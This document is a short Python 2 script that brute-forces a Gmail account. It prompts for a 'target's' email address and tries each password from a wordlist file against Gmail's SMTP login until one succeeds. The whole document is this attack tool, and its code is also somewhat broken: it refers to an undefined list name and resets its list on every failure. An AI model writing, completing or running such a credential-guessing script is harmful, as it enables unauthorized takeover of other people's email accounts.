import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("enter the target's email adress: ")
passwfile = open("test(1).txt", "r")

for password in passwfile:
    try:
        smtpserver.login(user,password)
        print "[+] Password Found: %s" % password
        print incorrect_list
        print len(incorrectlist)
        break;
    
    except smtplib.SMTPAuthenticationError:
     print "[!]Password Incorrect %s" % password
     incorrect_list = []
     incorrect_list.append(password)
   
